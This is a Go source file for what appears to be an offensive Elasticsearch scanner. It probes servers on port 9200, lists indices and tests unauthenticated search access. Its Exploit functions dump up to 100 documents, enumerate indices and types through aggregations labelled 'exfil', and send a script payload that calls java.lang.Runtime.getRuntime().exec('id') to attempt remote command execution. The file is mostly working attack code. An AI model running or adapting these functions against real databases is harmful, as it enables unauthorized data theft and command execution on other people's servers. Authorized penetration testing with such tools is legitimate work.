package nosql

import (
	"encoding/json"
	"fmt"
	"strings"
	"time"
)

type ESScanner struct {
	config *NoSQLConfig
	client *HTTPClient
}

func NewESScanner(config *NoSQLConfig, client *HTTPClient) *ESScanner {
	return &ESScanner{
		config: config,
		client: client,
	}
}

func (e *ESScanner) TestConnection(target string) bool {
	url := BuildURL(target, "/", 9200)
	_, _, err := e.client.Get(url, nil)
	return err == nil
}

func (e *ESScanner) GetVersion(target string) string {
	url := BuildURL(target, "/", 9200)
	_, body, err := e.client.Get(url, nil)
	if err != nil {
		return ""
	}

	var resp map[string]interface{}
	if json.Unmarshal(body, &resp) == nil {
		if version, ok := resp["version"].(map[string]interface{}); ok {
			if number, ok := version["number"].(string); ok {
				return number
			}
		}
	}
	return ""
}

func (e *ESScanner) ListIndices(target string) []string {
	url := BuildURL(target, "/_cat/indices?format=json", 9200)
	_, body, err := e.client.Get(url, nil)
	if err != nil {
		return nil
	}

	var indices []map[string]interface{}
	if json.Unmarshal(body, &indices) != nil {
		return nil
	}

	var result []string
	for _, idx := range indices {
		if name, ok := idx["index"].(string); ok {
			result = append(result, name)
		}
	}
	return result
}

func (e *ESScanner) TestQueryInject(target string) *InjectionPoint {
	url := BuildURL(target, "/_search", 9200)

	payloads := []struct {
		field   string
		payload string
	}{
		{"query", `{"match_all": {}}`},
		{"query", `{"bool": {"must": [{"match_all": {}}]}}`},
		{"query_string", `{"query": "*"}`},
		{"filtered", `{"filter": {"match_all": {}}}`},
	}

	for _, p := range payloads {
		body := strings.NewReader(fmt.Sprintf(`{"%s": %s}`, p.field, p.payload))
		resp, respBody, err := e.client.Post(url, body, map[string]string{
			"Content-Type": "application/json",
		})
		if err != nil {
			continue
		}

		if resp.StatusCode == 200 {
			var result map[string]interface{}
			if json.Unmarshal(respBody, &result) == nil {
				if hits, ok := result["hits"].(map[string]interface{}); ok {
					if total, ok := hits["total"].(float64); ok && total > 0 {
						return &InjectionPoint{
							ID:        GenerateID(),
							Target:    target,
							DBType:    NoSQLDBElasticsearch,
							Technique: TechniqueQueryInject,
							Field:     p.field,
							Payload:   p.payload,
							Parameters: map[string]string{
								"method": "query_dsl_injection",
							},
							Severity:  SeverityHigh,
							Verified:  true,
							Timestamp: time.Now(),
						}
					}
				}
			}
		}
	}
	return nil
}

func (e *ESScanner) TestAggregationExfil(target string) *InjectionPoint {
	url := BuildURL(target, "/_search", 9200)

	payload := `{
		"size": 0,
		"aggs": {
			"exfil": {
				"terms": {
					"field": "_index",
					"size": 100
				}
			}
		}
	}`

	body := strings.NewReader(payload)
	resp, respBody, err := e.client.Post(url, body, map[string]string{
		"Content-Type": "application/json",
	})
	if err != nil {
		return nil
	}

	if resp.StatusCode == 200 {
		var result map[string]interface{}
		if json.Unmarshal(respBody, &result) == nil {
			if _, ok := result["aggregations"]; ok {
				return &InjectionPoint{
					ID:        GenerateID(),
					Target:    target,
					DBType:    NoSQLDBElasticsearch,
					Technique: TechniqueAggregation,
					Field:     "aggs",
					Payload:   payload,
					Parameters: map[string]string{
						"method": "aggregation_exfiltration",
					},
					Severity:  SeverityMedium,
					Verified:  true,
					Timestamp: time.Now(),
				}
			}
		}
	}
	return nil
}

func (e *ESScanner) TestScriptInject(target string) *InjectionPoint {
	url := BuildURL(target, "/_search", 9200)

	payload := `{
		"size": 1,
		"query": {
			"match_all": {}
		},
		"script_fields": {
			"test": {
				"script": "1+1"
			}
		}
	}`

	body := strings.NewReader(payload)
	resp, respBody, err := e.client.Post(url, body, map[string]string{
		"Content-Type": "application/json",
	})
	if err != nil {
		return nil
	}

	if resp.StatusCode == 200 {
		var result map[string]interface{}
		if json.Unmarshal(respBody, &result) == nil {
			if hits, ok := result["hits"].(map[string]interface{}); ok {
				if hitList, ok := hits["hits"].([]interface{}); ok && len(hitList) > 0 {
					return &InjectionPoint{
						ID:        GenerateID(),
						Target:    target,
						DBType:    NoSQLDBElasticsearch,
						Technique: TechniqueScriptInject,
						Field:     "script_fields",
						Payload:   payload,
						Parameters: map[string]string{
							"method": "painless_script_injection",
						},
						Severity:  SeverityCritical,
						Verified:  true,
						Timestamp: time.Now(),
					}
				}
			}
		}
	}
	return nil
}

func (e *ESScanner) ExploitQueryInject(injection *InjectionPoint) (map[string]interface{}, error) {
	url := BuildURL(injection.Target, "/_search?size=100", 9200)

	payload := `{"query": {"match_all": {}}}`
	body := strings.NewReader(payload)

	_, resp, err := e.client.Post(url, body, map[string]string{
		"Content-Type": "application/json",
	})
	if err != nil {
		return nil, fmt.Errorf("exploit query inject: %w", err)
	}

	var result map[string]interface{}
	if json.Unmarshal(resp, &result) != nil {
		return nil, fmt.Errorf("failed to parse response")
	}

	data := map[string]interface{}{
		"method":   "query_dsl_exfiltration",
		"response": result,
	}
	return data, nil
}

func (e *ESScanner) ExploitAggregationExfil(injection *InjectionPoint) (map[string]interface{}, error) {
	url := BuildURL(injection.Target, "/_search", 9200)

	payload := `{
		"size": 0,
		"aggs": {
			"by_index": {
				"terms": {"field": "_index", "size": 100}
			},
			"by_type": {
				"terms": {"field": "_type", "size": 100}
			}
		}
	}`

	body := strings.NewReader(payload)
	_, resp, err := e.client.Post(url, body, map[string]string{
		"Content-Type": "application/json",
	})
	if err != nil {
		return nil, fmt.Errorf("exploit aggregation exfil: %w", err)
	}

	var result map[string]interface{}
	if json.Unmarshal(resp, &result) != nil {
		return nil, fmt.Errorf("failed to parse response")
	}

	data := map[string]interface{}{
		"method":   "aggregation_exfiltration",
		"response": result,
	}
	return data, nil
}

func (e *ESScanner) ExploitScriptInject(injection *InjectionPoint) (string, error) {
	url := BuildURL(injection.Target, "/_search", 9200)

	payload := `{
		"size": 0,
		"script_fields": {
			"rce_test": {
				"script": {
					"source": "java.lang.Runtime.getRuntime().exec('id')"
				}
			}
		}
	}`

	body := strings.NewReader(payload)
	_, resp, err := e.client.Post(url, body, map[string]string{
		"Content-Type": "application/json",
	})
	if err != nil {
		return "", fmt.Errorf("exploit script inject: %w", err)
	}

	return string(resp), nil
}
